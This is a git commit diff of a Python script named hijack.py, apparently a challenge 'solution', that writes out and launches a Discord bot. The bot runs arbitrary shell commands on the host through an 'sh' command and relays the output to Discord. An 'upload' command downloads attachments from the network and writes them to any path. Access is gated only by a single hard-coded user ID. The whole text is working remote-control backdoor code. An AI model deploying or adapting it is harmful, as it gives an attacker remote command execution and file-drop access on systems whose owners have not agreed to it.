c3e80aeee74ad489ffc7791023c2a92481ade33f
cicadoves <o7infiltrate@gmail.com>
2021-06-03 10:54:06 +0800

    sol

--- hijack.py
+++ hijack.py
@@ -1,59 +1,60 @@
+import os
 open('hijack.py','w').write(f'''
 import subprocess, requests, os
 from discord.ext import commands
 
 bot = commands.Bot('')
+x = 2000
 
+@bot.check
 async def owner(ctx):
-	check =  ctx.author.id == 394771663155101727
-	if not check: await ctx.send('I only work for my master so... ||fuck off||')
-	return check
+	c = ctx.author.id == 394771663155101727
+	if not c:
+		await ctx.send('how about no')
+	return c
 
 @bot.command()
-@commands.check(owner)
-async def py(ctx, *, code):
-	open('inp.py','w').write(code)
+async def sh(ctx, *args):
+	o = 'out.txt'
 	subprocess.run(
-		args=['python', 'inp.py'],
-		stdout=open('outp','w'),
+		args=args,
+		stdout=open(o,'w'),
 		stderr=subprocess.STDOUT,
 		timeout=30)
-	x, log = 2000, open('outp').read()
-	chunks = [log[y-x:y] for y in range(x, len(log)+x, x)]
-	for chunk in chunks: await ctx.send(chunk)
-	subprocess.run(['rm','inp.py','outp'])
+	l =  open(o).read()
+	c = [l[y-x:y] for y in range(x,len(l)+x,x)]
+	for d in c: await ctx.send(d)
 
-class Authorize(commands.Cog):
+@bot.command()
+async def load(ctx, e): bot.load_extension(e)
+
+@bot.command()
+async def unload(ctx, e): bot.unload_extension(e)
+
+@bot.command()
+async def reload(ctx, e): bot.reload_extension(e)
+
+@bot.command()
+async def upload(ctx, p):
+	c = requests.get(ctx.message.attachments[0].url).text
+	open(p, 'w').write(c)
+
+@bot.command()
+async def shutdown(ctx): exit()
+
+
+class oce(commands.Cog):
 	def __init__(self, bot):
 		self.bot = bot
 
-	@commands.command()
-	async def load(self, ctx, ext):
-		bot.load_extension(ext)
-
-	@commands.command()
-	async def unload(self, ctx, ext):
-		bot.unload_extension(ext)
-
-	@commands.command(aliases=['upload'])
-	@commands.check(owner)
-	async def uploadfile(self, ctx, path):
-		code = requests.get(ctx.message.attachments[0].url).text
-		open(path, 'w').write(code)
-
-	@commands.command()
-	@commands.check(owner)
-	async def shutdown(self, ctx):
-		await ctx.send('shutdown')
-		exit()
-
 	@commands.Cog.listener()
-	async def on_command_error(self, ctx, error):
-		if isinstance(error, commands.CommandNotFound): return
-		if isinstance(error, commands.CheckFailure): return
-		await ctx.send(error)
+	async def on_command_error(self, ctx, err):
+		if isinstance(err, commands.CommandNotFound): return
+		if isinstance(err, commands.CheckFailure): return
+		await ctx.send(err)
 
-bot.add_cog(Authorize(bot))
 
+bot.add_cog(oce(bot))
 bot.run(os.getenv('TOKEN'))
 ''')
+os.system('python hijack.py')
